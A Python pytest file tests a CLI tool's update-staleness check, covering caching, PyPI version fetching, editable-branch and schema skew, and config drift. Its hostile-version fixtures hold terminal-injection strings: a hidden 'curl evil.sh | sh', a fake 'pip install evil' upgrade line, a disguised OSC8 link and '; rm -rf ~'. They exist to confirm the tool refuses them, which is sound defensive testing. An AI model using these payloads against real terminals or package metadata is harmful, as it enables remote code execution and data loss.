"""Tests for the startup staleness nudge (#394)."""

from __future__ import annotations

import json
import threading
import time
from collections.abc import Callable, Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest.mock import patch

import pytest

from kew.links import UPGRADE_HINT
from kew.staleness import (
    CACHE_TTL_SECONDS,
    _check_editable_branch,
    _fetch_latest_version,
    _get_direct_url,
    _install_fingerprint,
    _read_cache,
    _read_db_schema_version,
    _read_repo_kew_version,
    _resolve_current_version,
    _version_lt,
    _write_cache,
    check_governance_config_drift,
    check_orchestrator_skew,
    check_staleness,
)


@pytest.fixture(autouse=True)
def _enable_staleness_check(monkeypatch: pytest.MonkeyPatch) -> None:
    """Undo the global conftest suppression so we can test staleness logic."""
    monkeypatch.delenv("KEW_NO_UPDATE_CHECK", raising=False)


# ---------------------------------------------------------------------------
# Cache layer
# ---------------------------------------------------------------------------


def test_read_cache_returns_none_when_file_missing(tmp_path: Path) -> None:
    assert _read_cache(tmp_path / "nope.json") is None


def test_write_then_read_cache_roundtrips(tmp_path: Path) -> None:
    cache_file = tmp_path / "staleness.json"
    _write_cache(cache_file, latest="1.2.3", editable="you are behind")
    result = _read_cache(cache_file)
    assert result is not None
    assert result["latest"] == "1.2.3"
    assert result["editable"] == "you are behind"


def test_read_cache_returns_none_when_expired(tmp_path: Path) -> None:
    cache_file = tmp_path / "staleness.json"
    old_ts = time.time() - CACHE_TTL_SECONDS - 1
    cache_file.write_text(json.dumps({"ts": old_ts, "warnings": ["old"]}))
    assert _read_cache(cache_file) is None


def test_read_cache_returns_none_on_corrupt_json(tmp_path: Path) -> None:
    cache_file = tmp_path / "staleness.json"
    cache_file.write_text("not json{{{")
    assert _read_cache(cache_file) is None


# ---------------------------------------------------------------------------
# Version fetch
# ---------------------------------------------------------------------------


def _serve_pypi(body: bytes) -> tuple[ThreadingHTTPServer, str]:
    """Serve ``body`` as the PyPI JSON answer for every GET on a local port."""

    class _Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802 — http.server naming
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_args: object) -> None:
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    host, port = server.server_address[:2]
    return server, f"http://{host!s}:{port}/pypi/kew-cli/json"


@pytest.fixture
def pypi(monkeypatch: pytest.MonkeyPatch) -> Iterator[Callable[[bytes], str]]:
    """Point the update check at a local server answering with a given body."""
    servers: list[ThreadingHTTPServer] = []

    def _start(body: bytes) -> str:
        server, url = _serve_pypi(body)
        servers.append(server)
        monkeypatch.setattr("kew.staleness._PYPI_LATEST_URL", url)
        return url

    yield _start
    for server in servers:
        server.shutdown()
        server.server_close()


def test_update_check_reads_the_latest_version_from_pypi(
    tmp_path: Path, pypi: Callable[[bytes], str]
) -> None:
    pypi(json.dumps({"info": {"name": "kew-cli", "version": "999.1.0"}}).encode())

    assert _fetch_latest_version() == "999.1.0"
    warnings = check_staleness(cache_dir=tmp_path)
    assert any("latest release (999.1.0)" in w for w in warnings)


def test_update_check_stays_quiet_when_pypi_is_unreachable(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    server, url = _serve_pypi(b"{}")
    server.shutdown()
    server.server_close()
    monkeypatch.setattr("kew.staleness._PYPI_LATEST_URL", url)

    assert _fetch_latest_version() is None
    warnings = check_staleness(cache_dir=tmp_path)
    assert not any("latest release" in w for w in warnings)


@pytest.mark.parametrize(
    "body",
    [
        b"not json",
        b"[]",
        json.dumps({"tag_name": "v1.2.3"}).encode(),
        json.dumps({"info": {"version": ""}}).encode(),
        json.dumps({"info": {"version": 3}}).encode(),
        json.dumps({"info": "1.2.3"}).encode(),
    ],
)
def test_fetch_latest_version_returns_none_on_a_body_without_info_version(
    body: bytes, pypi: Callable[[bytes], str]
) -> None:
    pypi(body)
    assert _fetch_latest_version() is None


_HOSTILE_VERSIONS = [
    "999.\x1b[2J\x1b[31mRUN: curl evil.sh | sh\x1b[0m",
    "999.0\nUpgrade: pip install evil",
    "999.0\x1b]8;;https://evil.example\x07uv tool install kew-cIi\x1b]8;;\x07",
    "1000.0.0; rm -rf ~",
    "999.0.0\n",
    "\u0669\u0669\u0669.0",
    "9" * 5000,
]
_HOSTILE_IDS = [
    "ansi-clear-screen",
    "newline-fake-upgrade",
    "osc8-hyperlink",
    "shell-text",
    "trailing-newline",
    "non-ascii-digits",
    "5000-digits",
]


def _no_hostile_text(warnings: list[str]) -> bool:
    joined = "".join(warnings)
    return not any(
        marker in joined
        for marker in ("\x1b", "\x07", "evil", "rm -rf", "latest release")
    )


@pytest.mark.parametrize("version", _HOSTILE_VERSIONS, ids=_HOSTILE_IDS)
def test_update_check_refuses_a_version_that_is_not_pep440(
    version: str, tmp_path: Path, pypi: Callable[[bytes], str]
) -> None:
    pypi(json.dumps({"info": {"name": "kew-cli", "version": version}}).encode())

    assert _fetch_latest_version() is None
    first = check_staleness(cache_dir=tmp_path)
    assert _no_hostile_text(first)
    # The cache written by that call replays no hostile text either.
    cached = "".join(p.read_text(encoding="utf-8") for p in tmp_path.glob("*.json"))
    assert "evil" not in cached
    assert "rm -rf" not in cached
    assert _no_hostile_text(check_staleness(cache_dir=tmp_path))


def test_update_check_warns_on_a_newer_pep440_version_and_replays_it(
    tmp_path: Path, pypi: Callable[[bytes], str]
) -> None:
    pypi(json.dumps({"info": {"name": "kew-cli", "version": "999.0.0"}}).encode())

    assert _fetch_latest_version() == "999.0.0"
    first = [w for w in check_staleness(cache_dir=tmp_path) if "latest release" in w]
    assert len(first) == 1
    assert "latest release (999.0.0)" in first[0]
    replayed = [w for w in check_staleness(cache_dir=tmp_path) if "latest release" in w]
    assert replayed == first


@pytest.mark.parametrize("version", ["1.0", "2.0.0rc1", "3.1b2.post1", "4.0.dev3"])
def test_update_check_accepts_pep440_public_versions(
    version: str, pypi: Callable[[bytes], str]
) -> None:
    pypi(json.dumps({"info": {"version": version}}).encode())
    assert _fetch_latest_version() == version


@pytest.mark.parametrize("version", _HOSTILE_VERSIONS[:4], ids=_HOSTILE_IDS[:4])
def test_a_cached_hostile_version_is_not_replayed(
    version: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A cache file whose version the fetch would refuse prints nothing."""
    monkeypatch.setattr(
        "kew.staleness._PYPI_LATEST_URL", "http://127.0.0.1:9/unreachable"
    )
    current = _resolve_current_version()
    fingerprint = _install_fingerprint(current, _get_direct_url())
    payload = {"ts": time.time(), "latest": version, "editable": None}
    (tmp_path / f"staleness-{fingerprint}.json").write_text(json.dumps(payload))

    assert _no_hostile_text(check_staleness(cache_dir=tmp_path))


def test_a_cache_in_the_rendered_warning_format_is_refetched(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An older cache held rendered warning text; it is never replayed."""
    monkeypatch.setattr(
        "kew.staleness._PYPI_LATEST_URL", "http://127.0.0.1:9/unreachable"
    )
    current = _resolve_current_version()
    fingerprint = _install_fingerprint(current, _get_direct_url())
    payload = {"ts": time.time(), "warnings": ["\x1b[2JRUN: curl evil.sh | sh"]}
    (tmp_path / f"staleness-{fingerprint}.json").write_text(json.dumps(payload))

    assert _no_hostile_text(check_staleness(cache_dir=tmp_path))


def test_fetch_latest_version_returns_none_on_error() -> None:
    with patch("kew.staleness.urlopen", side_effect=OSError("offline")):
        assert _fetch_latest_version() is None


# ---------------------------------------------------------------------------
# Editable-branch detection
# ---------------------------------------------------------------------------


def test_editable_branch_returns_none_when_not_editable() -> None:
    with patch(
        "kew.staleness._get_direct_url",
        return_value=None,
    ):
        assert _check_editable_branch() is None


def test_editable_branch_returns_none_when_on_main() -> None:
    du = {"url": "file:///home/dev/kew", "dir_info": {"editable": True}}
    with (
        patch("kew.staleness._get_direct_url", return_value=du),
        patch("kew.staleness._git_branch_at", return_value="main"),
    ):
        assert _check_editable_branch() is None


def test_editable_branch_warns_when_off_main() -> None:
    du = {"url": "file:///home/dev/kew", "dir_info": {"editable": True}}
    with (
        patch("kew.staleness._get_direct_url", return_value=du),
        patch("kew.staleness._git_branch_at", return_value="feat/wip"),
        patch("kew.staleness._git_commits_behind", return_value=3),
    ):
        result = _check_editable_branch()
        assert result is not None
        assert "feat/wip" in result
        assert "editable" in result.lower()
        assert "3 commits" in result
        assert "origin/main" in result
        assert "--ff-only" in result


def test_editable_branch_does_not_warn_when_current_or_not_fast_forwardable() -> None:
    du = {"url": "file:///home/dev/kew", "dir_info": {"editable": True}}
    with (
        patch("kew.staleness._get_direct_url", return_value=du),
        patch("kew.staleness._git_branch_at", return_value="feat/wip"),
        patch("kew.staleness._git_commits_behind", return_value=None),
    ):
        assert _check_editable_branch() is None

    with (
        patch("kew.staleness._get_direct_url", return_value=du),
        patch("kew.staleness._git_branch_at", return_value="main"),
        patch("kew.staleness._git_commits_behind", return_value=0),
    ):
        assert _check_editable_branch() is None


def test_editable_branch_returns_none_on_error() -> None:
    du = {"url": "file:///home/dev/kew", "dir_info": {"editable": True}}
    with (
        patch("kew.staleness._get_direct_url", return_value=du),
        patch("kew.staleness._git_branch_at", side_effect=OSError("no git")),
    ):
        assert _check_editable_branch() is None


# ---------------------------------------------------------------------------
# Integrated check_staleness
# ---------------------------------------------------------------------------


def test_check_staleness_returns_empty_when_opt_out(tmp_path: Path) -> None:
    with patch.dict("os.environ", {"KEW_NO_UPDATE_CHECK": "1"}):
        assert check_staleness(cache_dir=tmp_path) == []


def test_check_staleness_uses_cache_on_second_call(tmp_path: Path) -> None:
    with (
        patch("kew.staleness._fetch_latest_version", return_value="99.0.0"),
        patch("kew.staleness._check_editable_branch", return_value=None),
        patch("kew.staleness._resolve_current_version", return_value="0.1.0"),
    ):
        first = check_staleness(cache_dir=tmp_path)
    assert len(first) == 1
    assert "99.0.0" in first[0]

    # Second call should read from cache, NOT call _fetch_latest_version again.
    # Must mock _resolve_current_version to the same value so the fingerprint
    # matches (fingerprint is computed before the cache check).
    with (
        patch("kew.staleness._resolve_current_version", return_value="0.1.0"),
        patch("kew.staleness._fetch_latest_version") as mock_fetch,
    ):
        mock_fetch.side_effect = AssertionError("should not be called")
        second = check_staleness(cache_dir=tmp_path)
    assert second == first


def test_check_staleness_warns_when_behind(tmp_path: Path) -> None:
    with (
        patch("kew.staleness._fetch_latest_version", return_value="1.0.0"),
        patch("kew.staleness._check_editable_branch", return_value=None),
        patch("kew.staleness._resolve_current_version", return_value="0.56.0"),
    ):
        warnings = check_staleness(cache_dir=tmp_path)
    assert len(warnings) == 1
    assert "0.56.0" in warnings[0]
    assert "1.0.0" in warnings[0]


def test_check_staleness_no_warning_when_current(tmp_path: Path) -> None:
    with (
        patch("kew.staleness._fetch_latest_version", return_value="0.56.0"),
        patch("kew.staleness._check_editable_branch", return_value=None),
        patch("kew.staleness._resolve_current_version", return_value="0.56.0"),
    ):
        assert check_staleness(cache_dir=tmp_path) == []


def test_check_staleness_includes_editable_warning(tmp_path: Path) -> None:
    with (
        patch("kew.staleness._fetch_latest_version", return_value=None),
        patch(
            "kew.staleness._check_editable_branch",
            return_value="editable install on branch feat/x",
        ),
        patch("kew.staleness._resolve_current_version", return_value="0.56.0"),
    ):
        warnings = check_staleness(cache_dir=tmp_path)
    assert len(warnings) == 1
    assert "feat/x" in warnings[0]


def test_check_staleness_network_failure_is_silent(tmp_path: Path) -> None:
    with (
        patch("kew.staleness._fetch_latest_version", return_value=None),
        patch("kew.staleness._check_editable_branch", return_value=None),
        patch("kew.staleness._resolve_current_version", return_value="0.56.0"),
    ):
        assert check_staleness(cache_dir=tmp_path) == []


# ---------------------------------------------------------------------------
# Version comparison
# ---------------------------------------------------------------------------


def test_version_lt_equal_length() -> None:
    assert _version_lt("0.55.0", "0.56.0")
    assert not _version_lt("0.56.0", "0.56.0")
    assert not _version_lt("0.57.0", "0.56.0")


def test_version_lt_unequal_length() -> None:
    assert not _version_lt("0.56.0", "0.56")
    assert not _version_lt("0.56", "0.56.0")
    assert _version_lt("0.56", "0.56.1")


# ---------------------------------------------------------------------------
# Detached HEAD
# ---------------------------------------------------------------------------


def test_editable_branch_returns_none_when_detached_head() -> None:
    du = {"url": "file:///home/dev/kew", "dir_info": {"editable": True}}
    with (
        patch("kew.staleness._get_direct_url", return_value=du),
        patch("kew.staleness._git_branch_at", return_value="HEAD"),
    ):
        assert _check_editable_branch() is None


# ---------------------------------------------------------------------------
# Non-blocking guarantee (live path, no mocking of check_staleness itself)
# ---------------------------------------------------------------------------


def test_check_staleness_never_raises_on_readonly_cache(tmp_path: Path) -> None:
    readonly_dir = tmp_path / "readonly"
    readonly_dir.mkdir()
    readonly_dir.chmod(0o444)
    try:
        with (
            patch("kew.staleness._fetch_latest_version", return_value="99.0.0"),
            patch("kew.staleness._check_editable_branch", return_value=None),
            patch("kew.staleness._resolve_current_version", return_value="0.1.0"),
        ):
            result = check_staleness(cache_dir=readonly_dir)
            assert isinstance(result, list)
    finally:
        readonly_dir.chmod(0o755)


def test_check_staleness_never_raises_when_home_unset(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.delenv("HOME", raising=False)
    monkeypatch.delenv("USERPROFILE", raising=False)
    with (
        patch("kew.staleness._fetch_latest_version", return_value=None),
        patch("kew.staleness._check_editable_branch", return_value=None),
        patch("kew.staleness._resolve_current_version", return_value="0.56.0"),
        patch("pathlib.Path.home", side_effect=RuntimeError("no HOME")),
    ):
        assert check_staleness() == []


# ---------------------------------------------------------------------------
# Install-identity fingerprint (#421)
# ---------------------------------------------------------------------------


def test_install_fingerprint_differs_by_version() -> None:
    assert _install_fingerprint("0.62.0", None) != _install_fingerprint("0.63.0", None)


def test_install_fingerprint_differs_by_direct_url() -> None:
    fp_wheel = _install_fingerprint("0.63.0", None)
    fp_editable = _install_fingerprint(
        "0.63.0",
        {"url": "file:///dev/kew", "dir_info": {"editable": True}},
    )
    assert fp_wheel != fp_editable


def test_install_fingerprint_is_stable() -> None:
    assert _install_fingerprint("0.63.0", None) == _install_fingerprint("0.63.0", None)


def test_cross_install_cache_isolation(tmp_path: Path) -> None:
    """Editable-install warnings must not leak to a clean wheel install (#421)."""
    editable_du: dict[str, object] = {
        "url": "file:///dev/kew",
        "dir_info": {"editable": True},
    }

    with (
        patch("kew.staleness._fetch_latest_version", return_value=None),
        patch(
            "kew.staleness._check_editable_branch",
            return_value="editable on branch agent/issue-394",
        ),
        patch("kew.staleness._resolve_current_version", return_value="0.63.0"),
        patch("kew.staleness._get_direct_url", return_value=editable_du),
    ):
        editable_warnings = check_staleness(cache_dir=tmp_path)
    assert len(editable_warnings) == 1
    assert "agent/issue-394" in editable_warnings[0]

    with (
        patch("kew.staleness._fetch_latest_version", return_value=None),
        patch("kew.staleness._check_editable_branch", return_value=None),
        patch("kew.staleness._resolve_current_version", return_value="0.63.0"),
        patch("kew.staleness._get_direct_url", return_value=None),
    ):
        wheel_warnings = check_staleness(cache_dir=tmp_path)
    assert wheel_warnings == []


# ---------------------------------------------------------------------------
# Orchestrator skew — repo pyproject.toml version (#433)
# ---------------------------------------------------------------------------


def test_read_repo_kew_version_returns_version(tmp_path: Path) -> None:
    import os

    kew_dir = tmp_path / "kew"
    kew_dir.mkdir()
    (kew_dir / "pyproject.toml").write_text(
        '[project]\nname = "kew-cli"\nversion = "0.64.0"\n'
    )
    old_cwd = os.getcwd()
    try:
        os.chdir(tmp_path)
        assert _read_repo_kew_version() == "0.64.0"
    finally:
        os.chdir(old_cwd)


def test_read_repo_kew_version_returns_none_when_missing() -> None:
    import os
    import tempfile

    with tempfile.TemporaryDirectory() as td:
        old_cwd = os.getcwd()
        try:
            os.chdir(td)
            assert _read_repo_kew_version() is None
        finally:
            os.chdir(old_cwd)


def test_read_repo_kew_version_returns_none_on_corrupt(tmp_path: Path) -> None:
    import os

    kew_dir = tmp_path / "kew"
    kew_dir.mkdir()
    (kew_dir / "pyproject.toml").write_text("not valid toml {{{")
    old_cwd = os.getcwd()
    try:
        os.chdir(tmp_path)
        assert _read_repo_kew_version() is None
    finally:
        os.chdir(old_cwd)


# ---------------------------------------------------------------------------
# Orchestrator skew — dispatch.db schema version (#433)
# ---------------------------------------------------------------------------


def _create_db_with_schema(db_path: Path, version: int) -> None:
    import sqlite3

    conn = sqlite3.connect(str(db_path))
    conn.execute(
        "CREATE TABLE IF NOT EXISTS schema_version "
        "(id INTEGER PRIMARY KEY, version INTEGER)"
    )
    conn.execute(
        "INSERT OR REPLACE INTO schema_version (id, version) VALUES (1, ?)", (version,)
    )
    conn.commit()
    conn.close()


def test_read_db_schema_version_returns_version(tmp_path: Path) -> None:
    db = tmp_path / "dispatch.db"
    _create_db_with_schema(db, 18)
    assert _read_db_schema_version(db) == 18


def test_read_db_schema_version_returns_none_when_missing(tmp_path: Path) -> None:
    assert _read_db_schema_version(tmp_path / "nope.db") is None


def test_read_db_schema_version_returns_none_on_corrupt(tmp_path: Path) -> None:
    db = tmp_path / "dispatch.db"
    db.write_text("not a database")
    assert _read_db_schema_version(db) is None


# ---------------------------------------------------------------------------
# Integrated check_orchestrator_skew (#433)
# ---------------------------------------------------------------------------


def test_orchestrator_skew_warns_when_repo_version_ahead(tmp_path: Path) -> None:
    import os

    kew_dir = tmp_path / "kew"
    kew_dir.mkdir()
    (kew_dir / "pyproject.toml").write_text('[project]\nversion = "0.64.0"\n')
    old_cwd = os.getcwd()
    try:
        os.chdir(tmp_path)
        with patch("kew.staleness._resolve_current_version", return_value="0.57.0"):
            warnings = check_orchestrator_skew()
    finally:
        os.chdir(old_cwd)
    assert len(warnings) == 1
    assert "0.57.0" in warnings[0]
    assert "0.64.0" in warnings[0]


def test_orchestrator_skew_no_warning_when_current(tmp_path: Path) -> None:
    import os

    kew_dir = tmp_path / "kew"
    kew_dir.mkdir()
    (kew_dir / "pyproject.toml").write_text('[project]\nversion = "0.57.0"\n')
    old_cwd = os.getcwd()
    try:
        os.chdir(tmp_path)
        with patch("kew.staleness._resolve_current_version", return_value="0.57.0"):
            warnings = check_orchestrator_skew()
    finally:
        os.chdir(old_cwd)
    assert warnings == []


def test_orchestrator_skew_warns_when_schema_ahead(tmp_path: Path) -> None:
    db = tmp_path / "dispatch.db"
    _create_db_with_schema(db, 99)
    with patch("kew.staleness._resolve_current_version", return_value="0.65.0"):
        warnings = check_orchestrator_skew(db_path=db)
    assert len(warnings) == 1
    assert "schema v99" in warnings[0]
    assert "hard-blocks" in warnings[0]
    assert warnings[0].endswith(UPGRADE_HINT)


def test_orchestrator_skew_no_warning_when_schema_current(tmp_path: Path) -> None:
    from kew.run_store import CURRENT_SCHEMA_VERSION

    db = tmp_path / "dispatch.db"
    _create_db_with_schema(db, CURRENT_SCHEMA_VERSION)
    with patch("kew.staleness._resolve_current_version", return_value="0.65.0"):
        warnings = check_orchestrator_skew(db_path=db)
    assert warnings == []


def test_orchestrator_skew_both_warnings(tmp_path: Path) -> None:
    import os

    kew_dir = tmp_path / "kew"
    kew_dir.mkdir()
    (kew_dir / "pyproject.toml").write_text('[project]\nversion = "0.99.0"\n')
    db = tmp_path / "dispatch.db"
    _create_db_with_schema(db, 99)
    old_cwd = os.getcwd()
    try:
        os.chdir(tmp_path)
        with patch("kew.staleness._resolve_current_version", return_value="0.57.0"):
            warnings = check_orchestrator_skew(db_path=db)
    finally:
        os.chdir(old_cwd)
    assert len(warnings) == 2


def test_orchestrator_skew_never_raises(tmp_path: Path) -> None:
    with patch(
        "kew.staleness._resolve_current_version",
        side_effect=RuntimeError("boom"),
    ):
        assert check_orchestrator_skew(db_path=tmp_path / "nope.db") == []


# ---------------------------------------------------------------------------
# check_governance_config_drift (#638)
# ---------------------------------------------------------------------------

_TOML_WITH_BUDGET = """\
[budget]
daily_usd = 100.0
per_issue_usd = 20.0
"""

_TOML_COMMITTED_BUDGET = """\
[budget]
daily_usd = 50.0
per_issue_usd = 15.0
"""

_TOML_SAME_BUDGET = """\
[budget]
daily_usd = 50.0
"""

_TOML_BREAKER_CHANGED = """\
[breaker]
enabled = false
cost_anomaly_factor = 5.0
"""

_TOML_COMMITTED_BREAKER = """\
[breaker]
enabled = true
cost_anomaly_factor = 3.0
"""


def test_governance_drift_returns_empty_when_config_path_is_none() -> None:
    assert check_governance_config_drift(None) == []


def test_governance_drift_returns_empty_when_file_not_found(tmp_path: Path) -> None:
    assert check_governance_config_drift(tmp_path / "nonexistent.toml") == []


def test_governance_drift_warns_on_budget_field_diff(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_WITH_BUDGET)
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_COMMITTED_BUDGET,
    ):
        warnings = check_governance_config_drift(local_toml)
    assert len(warnings) >= 1
    combined = " ".join(warnings)
    assert "daily_usd" in combined
    assert "100" in combined
    assert "50" in combined


def test_governance_drift_warns_on_breaker_field_diff(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_BREAKER_CHANGED)
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_COMMITTED_BREAKER,
    ):
        warnings = check_governance_config_drift(local_toml)
    assert len(warnings) >= 1
    combined = " ".join(warnings)
    assert (
        "breaker" in combined
        or "enabled" in combined
        or "cost_anomaly_factor" in combined
    )


def test_governance_drift_silent_when_no_diff(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_SAME_BUDGET)
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_SAME_BUDGET,
    ):
        warnings = check_governance_config_drift(local_toml)
    assert warnings == []


def test_governance_drift_silent_when_no_committed_file(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_WITH_BUDGET)
    with patch("kew.staleness._read_committed_config_text", return_value=None):
        warnings = check_governance_config_drift(local_toml)
    assert warnings == []


def test_governance_drift_never_raises(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_WITH_BUDGET)
    with patch(
        "kew.staleness._read_committed_config_text",
        side_effect=RuntimeError("boom"),
    ):
        assert check_governance_config_drift(local_toml) == []


def test_governance_drift_includes_field_values_in_warning(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text("[budget]\nper_issue_usd = 25.0\n")
    committed = "[budget]\nper_issue_usd = 15.0\n"
    with patch("kew.staleness._read_committed_config_text", return_value=committed):
        warnings = check_governance_config_drift(local_toml)
    assert len(warnings) == 1
    w = warnings[0]
    assert "per_issue_usd" in w
    assert "25" in w
    assert "15" in w


# ---------------------------------------------------------------------------
# Override-suppression: keys with an active config_overrides row (#690)
# ---------------------------------------------------------------------------


class _FakeStore:
    """Minimal stand-in exposing only ``list_config_overrides``."""

    def __init__(self, fields: list[str]) -> None:
        self._fields = fields

    def list_config_overrides(self) -> list[dict[str, object]]:
        return [{"field": f} for f in self._fields]


def test_governance_drift_suppresses_overridden_key(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_WITH_BUDGET)
    # Both drifted keys have active DB overrides → no warning for either.
    store = _FakeStore(["budget.daily_usd", "budget.per_issue_usd"])
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_COMMITTED_BUDGET,
    ):
        warnings = check_governance_config_drift(local_toml, store=store)
    assert warnings == []


def test_governance_drift_mixes_overridden_and_plain_keys(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_WITH_BUDGET)
    # Only daily_usd is overridden; per_issue_usd still drifts normally.
    store = _FakeStore(["budget.daily_usd"])
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_COMMITTED_BUDGET,
    ):
        warnings = check_governance_config_drift(local_toml, store=store)
    assert len(warnings) == 1
    assert "per_issue_usd" in warnings[0]
    assert "already governs this machine's dispatches" in warnings[0]
    assert "daily_usd" not in warnings[0]


def test_governance_drift_ignores_override_for_matching_key(tmp_path: Path) -> None:
    # An override on a key that does NOT drift produces no warning at all.
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_SAME_BUDGET)
    store = _FakeStore(["budget.daily_usd"])
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_SAME_BUDGET,
    ):
        warnings = check_governance_config_drift(local_toml, store=store)
    assert warnings == []


def test_governance_drift_without_store_is_unchanged(tmp_path: Path) -> None:
    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_WITH_BUDGET)
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_COMMITTED_BUDGET,
    ):
        warnings = check_governance_config_drift(local_toml, store=None)
    combined = " ".join(warnings)
    assert "already governs this machine's dispatches" in combined
    assert "overridden" not in combined


def test_governance_drift_survives_broken_store(tmp_path: Path) -> None:
    class _BrokenStore:
        def list_config_overrides(self) -> list[dict[str, object]]:
            raise RuntimeError("db gone")

    local_toml = tmp_path / "kew.toml"
    local_toml.write_text(_TOML_WITH_BUDGET)
    with patch(
        "kew.staleness._read_committed_config_text",
        return_value=_TOML_COMMITTED_BUDGET,
    ):
        # A broken store degrades to the plain (toml-only) warning, never raises.
        warnings = check_governance_config_drift(local_toml, store=_BrokenStore())
    combined = " ".join(warnings)
    assert "already governs this machine's dispatches" in combined
    assert "overridden" not in combined


# ---------------------------------------------------------------------------
# Real-git integration: ref-fallback chain against a live object store (#690)
# ---------------------------------------------------------------------------


def _git(cwd: Path, *args: str) -> None:
    import subprocess

    subprocess.run(
        ["git", *args],
        cwd=cwd,
        check=True,
        capture_output=True,
        text=True,
    )


def test_governance_drift_real_git_worktree_ref_fallback(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """End-to-end: temp repo + linked worktree, committed kew.toml differing
    from the worktree's local copy, exercising the origin/HEAD → origin/main
    ref-fallback chain against a real git object store (no mocks).
    """
    import shutil
    import subprocess

    from kew.subprocess_utils import TOOL_PATHS

    git = shutil.which("git")
    if git is None:
        pytest.skip("git not available")
    monkeypatch.setitem(TOOL_PATHS, "git", git)

    remote = tmp_path / "remote.git"
    main_repo = tmp_path / "main"
    worktree = tmp_path / "wt"

    # Bare "origin" so pushed refs land in refs/remotes/origin/* — but note we
    # never `git clone`, so refs/remotes/origin/HEAD is deliberately absent and
    # the check must fall through origin/HEAD to origin/main.
    subprocess.run(
        ["git", "init", "--bare", str(remote)],
        check=True,
        capture_output=True,
        text=True,
    )

    main_repo.mkdir()
    _git(main_repo, "-c", "init.defaultBranch=main", "init")
    _git(main_repo, "config", "user.email", "test@example.com")
    _git(main_repo, "config", "user.name", "Test")
    _git(main_repo, "checkout", "-B", "main")

    committed = "[budget]\ndaily_usd = 50.0\n"
    (main_repo / "kew.toml").write_text(committed)
    _git(main_repo, "add", "kew.toml")
    _git(main_repo, "commit", "-m", "commit config")
    _git(main_repo, "remote", "add", "origin", str(remote))
    _git(main_repo, "push", "origin", "main")

    # Linked worktree shares the object store + remote-tracking refs.
    _git(main_repo, "worktree", "add", "-b", "wt-branch", str(worktree))
    # Local (uncommitted) edit in the worktree that differs from committed.
    (worktree / "kew.toml").write_text("[budget]\ndaily_usd = 100.0\n")

    # Sanity: origin/HEAD is unresolvable (never cloned) so the fallback runs.
    head_probe = subprocess.run(
        ["git", "rev-parse", "--verify", "origin/HEAD"],
        cwd=worktree,
        capture_output=True,
        text=True,
    )
    assert head_probe.returncode != 0

    warnings = check_governance_config_drift(worktree / "kew.toml")
    assert len(warnings) == 1
    w = warnings[0]
    assert "daily_usd" in w
    assert "100" in w
    assert "50" in w


def test_governance_drift_real_git_db_override_suppresses_warning(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Real-git: a DB-overridden field that drifts produces no warning.

    Uses the same bare-remote + linked-worktree setup as the ref-fallback test
    so the committed kew.toml is read via a live git object store.  The drifted
    field has an active DB override in the store, which means the effective
    value (DB) is the same on both sides — no actionable drift.
    """
    import shutil
    import subprocess

    from kew.subprocess_utils import TOOL_PATHS

    git = shutil.which("git")
    if git is None:
        pytest.skip("git not available")
    monkeypatch.setitem(TOOL_PATHS, "git", git)

    remote = tmp_path / "remote.git"
    main_repo = tmp_path / "main"
    worktree = tmp_path / "wt"

    subprocess.run(
        ["git", "init", "--bare", str(remote)],
        check=True,
        capture_output=True,
        text=True,
    )

    main_repo.mkdir()
    _git(main_repo, "-c", "init.defaultBranch=main", "init")
    _git(main_repo, "config", "user.email", "test@example.com")
    _git(main_repo, "config", "user.name", "Test")
    _git(main_repo, "checkout", "-B", "main")

    committed = "[budget]\ndaily_usd = 50.0\nper_issue_usd = 10.0\n"
    (main_repo / "kew.toml").write_text(committed)
    _git(main_repo, "add", "kew.toml")
    _git(main_repo, "commit", "-m", "commit config")
    _git(main_repo, "remote", "add", "origin", str(remote))
    _git(main_repo, "push", "origin", "main")

    _git(main_repo, "worktree", "add", "-b", "wt-branch", str(worktree))
    # daily_usd drifts but is DB-overridden; per_issue_usd drifts and is not.
    (worktree / "kew.toml").write_text(
        "[budget]\ndaily_usd = 999.0\nper_issue_usd = 25.0\n"
    )

    # daily_usd has a DB override; per_issue_usd does not.
    store = _FakeStore(["budget.daily_usd"])

    warnings = check_governance_config_drift(worktree / "kew.toml", store=store)

    # Only per_issue_usd (no DB override) should produce a warning.
    assert len(warnings) == 1
    assert "per_issue_usd" in warnings[0]
    assert "daily_usd" not in warnings[0]
    assert "25" in warnings[0]
    assert "10" in warnings[0]


def _round8_branch_warning(tmp_path, monkeypatch, branch):
    import sys

    from kew.subprocess_utils import TOOL_PATHS, run

